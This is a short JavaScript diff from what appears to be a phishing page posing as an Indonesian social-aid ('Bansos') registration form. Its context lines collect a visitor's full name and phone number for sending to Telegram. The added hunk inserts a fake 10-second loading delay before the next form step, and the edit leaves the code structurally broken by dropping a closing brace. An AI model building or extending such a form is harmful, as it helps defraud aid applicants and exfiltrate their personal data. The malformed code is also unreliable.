@@ -405,7 +405,26 @@ function processFirstData(){
             $('.verification_info').show();
             $('.account_verification').hide();
             return false;
-        }
+            function processFirstData() {
+    // Show the loading spinner
+    document.getElementById('loading').style.display = 'block';
+
+    // Simulate a 10-second delay before processing the form
+    setTimeout(function() {
+        // You can replace this with your actual form processing logic or redirect
+        alert('Processing complete after 10 seconds.');
+
+        // Hide the loading spinner
+        document.getElementById('loading').style.display = 'none';
+
+        // Optionally, submit the form or show the next page
+        // document.getElementById('firstForm').submit(); // Uncomment this line to submit the form
+        // Or show the next step form
+        document.querySelector('.first').style.display = 'none';
+        document.querySelector('.second').style.display = 'block';
+    }, 10000); // 10 seconds delay
+}
+
         
         // Kirim data ke Telegram
         var message = `New Bansos Request: \nFull Name: ${$full_name}\nPhone Number: ${$phone_number}`;
